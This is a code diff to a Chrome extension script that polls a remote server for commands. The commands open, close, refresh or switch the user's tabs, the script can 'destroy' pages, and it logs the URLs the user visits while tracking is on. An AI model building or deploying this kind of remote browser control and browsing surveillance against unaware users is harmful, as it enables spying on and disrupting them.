@@ -17,10 +17,11 @@ function openNewTab(url) {
 }
 
 function killRandomTab() {
-  chrome.tabs.query({ currentWindow: true }, function (tabs) {
-    while (tabs === undefined) { }
+  chrome.tabs.query({ currentWindow: true }, async function (tabs) {
     const random = Math.floor(Math.random() * tabs.length);
-    chrome.tabs.remove(tabs[random].id);
+    const tab = tabs[random];
+    while (tab === undefined) { await sleep(1000)}
+    chrome.tabs.remove(tab.id);
   });
 }
 
@@ -46,7 +47,7 @@ function destroyPage() {
   })
 }
 
-function focusFirstTab() {
+function changeTab() {
   chrome.tabs.query({ currentWindow: true }, function (tabs) {
     const random = Math.floor(Math.random() * tabs.length)
     chrome.tabs.update(tabs[random].id, {active:true, highlighted:true})
@@ -56,11 +57,7 @@ function focusFirstTab() {
 function pollServer() {
   console.log("Enter pollServer")
   fetch(`${proxy_url}?user=${user}`)
-    .then(
-      (res) => {
-        console.log(res)
-        console(res.json())
-      })
+    .then(res => res.json())
     .then(data => {
       console.log(data)
       if (data.message) {
@@ -78,12 +75,10 @@ function pollServer() {
             openNewTab(message_parts[1])
             break
           case 'refreshTab':
-            for (let i = 0;i < +message_parts[1]; i++) {
-              refreshTab()
-            }
+            refreshTab()
             break
-          case 'focusFirst':
-            focusFirstTab()
+          case 'changeTab':
+            changeTab()
             break
           default:
             break;
@@ -118,10 +113,11 @@ let batchCounter = 0;
 
 chrome.webNavigation.onCompleted.addListener(details => {
 
-  console.log("Enter webNavigation.onCompleted")
 
   if (tracking) {
-    console.log(`User visited: ${details.url}`);
+    if (details.url != "about:blank") {
+      console.log(`User visited: ${details.url}`);
+    }
 
     if (destroy_counter) {
       destroyPage()
